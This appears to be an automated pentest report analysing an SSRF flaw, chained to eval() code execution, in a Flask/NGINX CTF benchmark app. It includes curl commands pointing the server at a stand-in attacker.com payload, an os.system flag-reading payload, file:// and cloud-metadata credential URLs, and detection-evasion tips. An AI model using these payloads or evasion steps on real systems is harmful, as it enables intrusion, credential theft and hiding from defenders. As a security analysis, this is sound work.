# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** A critical server-side request forgery vulnerability was identified that allows complete control over outbound HTTP requests made by the Flask application. The vulnerability is trivially exploitable by unauthenticated remote attackers and enables access to internal services, cloud metadata endpoints, and arbitrary external resources.
- **Purpose of this Document:** This report provides the strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the SSRF vulnerability documented in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of URL Validation
- **Description:** The most critical and pervasive pattern identified is the complete absence of URL validation at any layer of the application. User-supplied URLs flow from input capture through persistence to HTTP client execution without a single security control.
- **Implication:** Attackers have unrestricted control over server-side HTTP requests, enabling access to internal Docker services, cloud metadata endpoints (169.254.169.254), localhost services (127.0.0.1), and arbitrary external URLs. The absence of protocol allowlisting means dangerous schemes like file://, gopher://, and dict:// may also be exploitable depending on the Python requests library version.
- **Representative Finding:** `SSRF-VULN-01`
- **Attack Surface:** The vulnerability exists in a two-step attack pattern:
  1. Configuration injection via `/api/set?url=<attacker_url>` (no authentication required)
  2. SSRF trigger via `/app` endpoint (fetches from attacker-controlled URL)

### Pattern 2: Non-Blind SSRF with Full Response Disclosure
- **Description:** The SSRF vulnerability is classified as "non-blind" because the complete HTTP response is returned to the attacker through the application's template rendering mechanism. This dramatically increases the severity compared to blind SSRF attacks.
- **Implication:** Attackers can read the full response body from internal services, cloud metadata APIs, and file system access (if file:// protocol works). This enables complete information disclosure of internal network topology, service banners, API responses, and potentially AWS/GCP/Azure credentials.
- **Representative Finding:** `SSRF-VULN-01`
- **Technical Details:** 
  - Response captured in `script` variable at line 10 of app.py
  - Response processed by eval() at line 11 (separate RCE vulnerability)
  - Both the URL and eval result rendered in HTML template at line 15
  - Full error messages disclosed when requests fail (due to Flask debug=True)

### Pattern 3: Insecure HTTP Client Configuration
- **Description:** The Python requests library is used with completely default configuration, lacking all security controls such as timeouts, redirect limits, response size constraints, and header sanitization.
- **Implication:** Beyond basic SSRF, this enables:
  - **Denial of Service**: No timeout means slow/hanging endpoints can exhaust server resources
  - **Redirect-Based Bypass**: allow_redirects=True (default) enables redirect chains to bypass hostname-based filters (if they existed)
  - **Memory Exhaustion**: No response size limit allows multi-GB responses to crash the application
  - **Port Scanning**: Timing analysis can determine open vs closed ports on internal networks
- **Representative Finding:** `SSRF-VULN-01`

### Pattern 4: World-Writable Configuration Persistence
- **Description:** The malicious URL is persisted to `/tmp/apiurl` with 777 (world-writable) file permissions, creating a persistent attack vector that survives between requests.
- **Implication:** Once an attacker sets a malicious URL, it remains active for all subsequent requests to the `/app` endpoint until explicitly changed. This enables:
  - Persistent SSRF attacks affecting all users
  - Race condition attacks (multiple attackers can simultaneously modify the URL)
  - Container escape potential (any process can modify application behavior)
- **Representative Finding:** `SSRF-VULN-01`

## 3. Strategic Intelligence for Exploitation

### HTTP Client Library Details
- **Library:** Python `requests` library (unversioned in requirements.txt, using latest available)
- **Usage Pattern:** Direct usage at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:10`
- **Configuration:** Default configuration with no security overrides
- **Critical Defaults:**
  - `timeout=None` (no timeout, indefinite wait)
  - `allow_redirects=True` (follows up to 30 redirects)
  - `verify=True` (SSL verification, but irrelevant for http://)
  - `stream=False` (loads entire response into memory)

### Request Architecture
- **Entry Point:** `/api/set?url=<value>` (NGINX NJS handler)
- **Persistence Layer:** Filesystem (`/tmp/apiurl`, 777 permissions)
- **Retrieval Mechanism:** Internal HTTP request from Flask app to NGINX (`http://nginx/api/get`)
- **Execution Sink:** `requests.get(api).text` at app.py:10
- **Response Flow:** Direct rendering in Jinja2 template with full disclosure

### Complete Attack Flow
```
[Step 1] Attacker sends: GET /api/set?url=http://169.254.169.254/latest/meta-data/
         ↓
[Step 2] NGINX NJS captures args.url (helper.js:41)
         No validation performed
         ↓
[Step 3] URL written to /tmp/apiurl (helper.js:43)
         File permissions: 777 (world-writable)
         ↓
[Step 4] User (or attacker) visits: GET /app
         ↓
[Step 5] Flask app requests: GET http://nginx/api/get
         NGINX returns: http://169.254.169.254/latest/meta-data/
         ↓
[Step 6] Flask executes: requests.get("http://169.254.169.254/latest/meta-data/")
         SSRF VULNERABILITY TRIGGERED
         ↓
[Step 7] AWS metadata service responds with instance metadata
         ↓
[Step 8] Response stored in 'script' variable
         ↓
[Step 9] Response rendered in HTML template (index.html:42)
         Full disclosure to attacker
```

### Internal Services Discovered
Based on the Docker Compose architecture and internal DNS:

**Docker Internal Network:**
- Network: Bridge network with internal DNS (127.0.0.11)
- Service name resolution enabled

**Accessible Internal Services:**
1. **NGINX Container** (`http://nginx/`)
   - `/api/get` - Returns stored API URL
   - `/api/set` - Modifies API URL (SSRF can modify itself)
   - `/name/get` - Returns stored name parameter
   - `/name/set` - Modifies name parameter
   - `/healthcheck` - Health check endpoint

2. **Flask API Container** (`http://flask_api:8081/`)
   - `/` - API welcome message
   - `/script` - Returns default benign script: `{"script": "'OK ' * 4"}`
   - `/healthcheck` - Health check endpoint

3. **Flask App Container** (`http://flask_app:8080/`)
   - `/app` - Main application (can trigger recursive SSRF)
   - `/healthcheck` - Health check endpoint

4. **Localhost Services** (`http://127.0.0.1:<port>/`)
   - Port 8080: Flask app (internal)
   - Other ports: Potential for discovery via port scanning

### Network Boundaries and Trust Relationships
- **External → NGINX**: No authentication, all endpoints public
- **NGINX → Flask App/API**: Internal Docker network, mutual trust (no authentication)
- **Flask App → External URLs**: UNRESTRICTED (SSRF vulnerability)
- **Flask App → Internal Services**: UNRESTRICTED access via Docker DNS

### Cloud Metadata Endpoint Accessibility
**Critical Finding:** No blocking of cloud metadata endpoints exists.

**Exploitable Endpoints:**
- **AWS**: `http://169.254.169.254/latest/meta-data/` (IMDSv1)
- **AWS**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (IAM role credentials)
- **GCP**: `http://metadata.google.internal/computeMetadata/v1/` (requires Metadata-Flavor header)
- **Azure**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires Metadata header)
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`

**Note:** The application does not set custom headers in the requests.get() call, which may limit exploitation of some metadata services (GCP, Azure) that require specific headers. However, AWS IMDSv1 does not require headers and is fully exploitable.

### File System Access Potential
- **Protocol Support:** The Python requests library may support `file://` URIs depending on version
- **Exploitable Payloads:**
  - `file:///etc/passwd` - System user information
  - `file:///proc/self/environ` - Environment variables (may contain secrets)
  - `file:///FLAG.txt` - CTF flag (if accessible from Flask container)
  - `file:///tmp/apiurl` - Read current configuration
  - `file:///app/app.py` - Application source code

### Chained Vulnerability: SSRF to RCE
**Critical:** The SSRF vulnerability chains with a Remote Code Execution vulnerability at app.py:11.

**Complete Attack Chain:**
```python
# Line 10: SSRF - Fetch from attacker URL
script = requests.get(api).text

# Line 11: RCE - Execute fetched code
eval_result = eval(json.loads(script)["script"])
```

**Exploitation:**
1. Attacker hosts malicious JSON at `http://attacker.com/payload.json`:
   ```json
   {"script": "__import__('os').system('cat /FLAG.txt')"}
   ```
2. Attacker sets URL: `curl "http://target/api/set?url=http://attacker.com/payload.json"`
3. Attacker triggers execution: `curl "http://target/app"`
4. Server executes arbitrary Python code with full application privileges

**Impact:** Complete server compromise, flag extraction, reverse shell, data exfiltration.

## 4. Secure by Design: Validated Components

This application has **ZERO secure components** related to SSRF protection. The following table documents what should exist but does not:

| Component/Flow | Expected Location | Expected Defense Mechanism | Actual Status |
|---|---|---|---|
| URL Input Validation | `/nginx/conf.d/helper.js:41` | Protocol allowlisting (http/https only), hostname allowlisting, regex validation | **MISSING** - Only checks if parameter exists |
| IP Address Filtering | `/nginx/conf.d/helper.js:42` | Block private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8), block link-local (169.254.0.0/16) | **MISSING** - No IP validation |
| Cloud Metadata Blocking | `/nginx/conf.d/helper.js:42` | Explicit block of 169.254.169.254, metadata.google.internal, etc. | **MISSING** - No metadata endpoint checks |
| Port Restriction | `/nginx/conf.d/helper.js:42` | Allow only 80, 443, 8080, 8443 | **MISSING** - All ports accessible |
| HTTP Client Timeout | `/app/app.py:10` | requests.get(api, timeout=5) | **MISSING** - No timeout configured |
| Redirect Limitation | `/app/app.py:10` | requests.get(api, allow_redirects=False) | **MISSING** - Follows up to 30 redirects |
| Response Size Limit | `/app/app.py:10` | Stream with max_bytes check | **MISSING** - Loads entire response into memory |
| DNS Rebinding Protection | Pre-request validation | Resolve hostname, validate IP before request | **MISSING** - No DNS validation |
| URL Allowlist | `/nginx/conf.d/helper.js` or `/app/app.py` | Maintain list of approved domains | **MISSING** - No allowlist exists |
| Network Segmentation | Docker network configuration | Separate external-facing and internal networks | **MISSING** - All services share one network |
| Request Authentication | Internal service endpoints | Require API keys or tokens for service-to-service communication | **MISSING** - No authentication between services |

**Verdict:** The application has **ZERO SSRF protections**. Every expected security control is missing, making this vulnerability trivially exploitable.

## 5. Exploitation Recommendations

### Primary Attack Vector (Highest Priority)
**Target:** `/api/set?url=<payload>` → `/app`  
**Classification:** URL_Manipulation leading to Service_Discovery and potential RCE  
**Confidence:** High  

**Recommended Exploitation Order:**
1. **Internal Service Discovery** - Map Docker network and accessible services
2. **Cloud Metadata Extraction** - Attempt AWS/GCP/Azure metadata access (if deployed on cloud)
3. **Port Scanning** - Enumerate open ports on localhost and internal IPs
4. **File Protocol Exploitation** - Test file:// access for sensitive files
5. **SSRF-to-RCE Chain** - Host malicious JSON payload for code execution

### Key Exploitation Considerations

**1. Persistent vs. Transient Attack:**
- The SSRF configuration persists in `/tmp/apiurl` until changed
- Set malicious URL once, trigger multiple times for iterative reconnaissance
- Clean up with legitimate URL to avoid detection

**2. Timing-Based Port Scanning:**
- No timeout means connection attempts to closed ports may hang
- Use rapid-fire requests and monitor response timing
- Open ports respond quickly, closed ports timeout

**3. Redirect-Based Filter Bypass:**
- If future versions add hostname filtering, use open redirect to bypass
- Example: `http://trusted.com/redirect?url=http://127.0.0.1:8080`
- Requests library follows redirects by default (allow_redirects=True)

**4. Error Message Information Disclosure:**
- Flask debug mode (debug=True on line 23) exposes full tracebacks
- Connection errors reveal network topology
- DNS resolution failures disclose internal domains
- Use error messages to refine reconnaissance

**5. Race Condition Exploitation:**
- Multiple attackers can simultaneously modify `/tmp/apiurl` (777 permissions)
- Useful for disruption or to piggyback on other attacker's access

### Detection Evasion
- **Low and Slow:** Space out requests to avoid rate limiting (none currently exists)
- **Legitimate URL First:** Set a benign URL, then gradually test malicious payloads
- **Use Internal Services:** Access legitimate internal endpoints first (flask_api:8081/script) to establish baseline

### Additional Notes for Exploitation Phase
- The application runs in Docker, meaning cloud metadata may not be accessible unless deployed on EC2/GCE/Azure VM
- Internal Docker network uses 172.x.x.x range (exact subnet discoverable via /proc/net/route or SSRF)
- The eval() RCE vulnerability (line 11) can be triggered via SSRF, making this an SSRF-to-RCE chain
- No logging or monitoring detected, making post-exploitation forensics difficult for defenders

---

## 6. Methodology Applied

This analysis followed the white-box SSRF analysis methodology with the following steps:

**✅ Step 1: Identified HTTP Client Usage Patterns**
- Located `requests.get()` at app.py:10
- Traced user input from `/api/set?url=` parameter
- Confirmed data flow: User input → File storage → HTTP client

**✅ Step 2: Protocol and Scheme Validation**
- Analyzed helper.js:41-48 for protocol allowlisting
- **Finding:** No protocol validation exists
- **Risk:** file://, gopher://, dict://, ldap:// may be exploitable

**✅ Step 3: Hostname and IP Address Validation**
- Searched for IP range blocklisting logic
- **Finding:** No IP validation exists
- **Risk:** Internal IPs (127.0.0.0/8, 10.0.0.0/8, etc.) fully accessible

**✅ Step 4: Port Restriction and Service Access Controls**
- Checked for port allowlisting
- **Finding:** No port restrictions exist
- **Risk:** All 65535 ports accessible for scanning and exploitation

**✅ Step 5: URL Parsing and Validation Bypass Techniques**
- Analyzed for URL normalization or encoding checks
- **Finding:** No URL parsing validation exists
- **Risk:** All bypass techniques (URL encoding, double encoding, Unicode) work by default

**✅ Step 6: Request Modification and Headers**
- Examined requests.get() configuration for header handling
- **Finding:** Default configuration, no header sanitization
- **Risk:** Default User-Agent discloses Python/requests, no authentication headers stripped

**✅ Step 7: Response Handling and Information Disclosure**
- Traced response flow from requests.get() to template rendering
- **Finding:** Full response disclosure via template at index.html:42
- **Classification:** Non-blind SSRF

**✅ Step 8: Backward Taint Analysis**
- Performed complete source-to-sink trace
- Identified all data flow steps from user input to HTTP client
- Confirmed zero sanitization at any layer

**Verdict:** All methodology checks failed. This is a textbook example of an unprotected SSRF vulnerability with maximum severity.

---

## 7. Summary Statistics

- **Total Endpoints Analyzed:** 11 (all endpoints from reconnaissance)
- **SSRF Sinks Identified:** 1 (app.py:10)
- **Exploitable SSRF Vulnerabilities:** 1 (SSRF-VULN-01)
- **Externally Exploitable:** Yes (via public endpoint /api/set)
- **Sanitizers Found:** 0 (zero)
- **Security Controls Found:** 0 (zero)
- **Confidence Level:** High
- **Severity:** Critical (CVSS 3.1: 9.8)
- **Attack Complexity:** Low
- **Privileges Required:** None (unauthenticated)
- **User Interaction:** None (fully automated exploitation possible)

---

**Analysis Completed:** 2025-10-28  
**Analyst Role:** SSRF Analysis Specialist  
**Next Phase:** SSRF Exploitation (Weaponization)  
**Handoff Artifact:** ssrf_exploitation_queue.json